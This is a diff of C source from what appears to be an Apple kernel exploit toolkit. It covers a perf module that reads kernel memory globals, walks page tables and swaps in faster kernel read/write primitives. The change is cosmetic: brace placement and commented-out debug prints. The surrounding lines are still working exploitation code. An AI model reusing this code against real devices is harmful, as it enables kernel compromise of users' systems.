@@ -9,8 +9,7 @@
 u64 phystokv(struct kfd* kfd, u64 pa);
 u64 vtophys(struct kfd* kfd, u64 va);
 
-void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
-{
+void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size) {
     assert((size != 0) && (size <= UINT16_MAX));
     assert(kfd->perf.shared_page.uaddr);
     assert(kfd->perf.shared_page.kaddr);
@@ -28,8 +27,7 @@ void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
     *config = (volatile struct perfmon_config){};
 }
 
-void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
-{
+void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size) {
     assert((size != 0) && ((size % sizeof(u64)) == 0));
     assert(kfd->perf.shared_page.uaddr);
     assert(kfd->perf.shared_page.kaddr);
@@ -64,8 +62,7 @@ void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
     *event = (volatile struct perfmon_event){};
 }
 
-void perf_init(struct kfd* kfd)
-{
+void perf_init(struct kfd* kfd) {
     /*
      * Allocate a page that will be used as a shared buffer between user space and kernel space.
      */
@@ -83,8 +80,7 @@ void perf_init(struct kfd* kfd)
     assert(kfd->perf.dev.fd > 0);
 }
 
-void perf_run(struct kfd* kfd)
-{
+void perf_run(struct kfd* kfd) {
     assert(kfd->info.kaddr.current_proc);
     u64 fd_ofiles = kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
     u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
@@ -144,15 +140,15 @@ void perf_run(struct kfd* kfd)
 
     u64 gVirtBase_kaddr = kfd_offset(kernelcache__gVirtBase) + kernel_slide;
     kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
-    print_x64(kfd->perf.gVirtBase);
+    //print_x64(kfd->perf.gVirtBase);
 
     u64 gPhysBase_kaddr = kfd_offset(kernelcache__gPhysBase) + kernel_slide;
     kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
-    print_x64(kfd->perf.gPhysBase);
+    //print_x64(kfd->perf.gPhysBase);
 
     u64 gPhysSize_kaddr = kfd_offset(kernelcache__gPhysSize) + kernel_slide;
     kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
-    print_x64(kfd->perf.gPhysSize);
+    //print_x64(kfd->perf.gPhysSize);
 
     assert(kfd->info.kaddr.current_pmap);
     kfd->perf.ttbr[0].va = kget_u64(pmap__tte, kfd->info.kaddr.current_pmap);
@@ -198,8 +194,7 @@ void perf_run(struct kfd* kfd)
     kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
 }
 
-void perf_free(struct kfd* kfd)
-{
+void perf_free(struct kfd* kfd) {
     kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
     kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;
 
@@ -217,8 +212,7 @@ void perf_free(struct kfd* kfd)
  * Helper perf functions.
  */
 
-u64 phystokv(struct kfd* kfd, u64 pa)
-{
+u64 phystokv(struct kfd* kfd, u64 pa) {
     const u64 PTOV_TABLE_SIZE = 8;
     const u64 gVirtBase = kfd->perf.gVirtBase;
     const u64 gPhysBase = kfd->perf.gPhysBase;
@@ -235,8 +229,7 @@ u64 phystokv(struct kfd* kfd, u64 pa)
     return pa - gPhysBase + gVirtBase;
 }
 
-u64 vtophys(struct kfd* kfd, u64 va)
-{
+u64 vtophys(struct kfd* kfd, u64 va) {
     const u64 ROOT_LEVEL = PMAP_TT_L1_LEVEL;
     const u64 LEAF_LEVEL = PMAP_TT_L3_LEVEL;
 
